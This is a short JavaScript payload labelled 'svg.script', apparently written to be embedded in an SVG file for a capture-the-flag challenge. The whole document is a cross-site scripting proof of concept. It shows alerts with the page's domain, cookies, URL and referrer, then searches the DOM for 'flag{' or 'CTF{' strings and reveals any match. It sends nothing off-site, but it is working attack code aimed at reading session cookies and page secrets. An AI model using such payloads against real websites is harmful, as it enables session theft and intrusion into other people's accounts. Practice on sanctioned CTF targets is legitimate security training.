svg.script:
// Alert all potentially interesting data
alert('Domain: ' + document.domain + '\n' +
      'Cookies: ' + document.cookie + '\n' +
      'URL: ' + document.location + '\n' +
      'Referrer: ' + document.referrer);

// Try to find flag in DOM
if(document.body.innerHTML.includes('flag{') || document.body.innerHTML.includes('CTF{')) {
  alert('FLAG FOUND IN PAGE: ' + document.body.innerHTML.match(/(flag|CTF)\{.*?\}/)[0]);
}
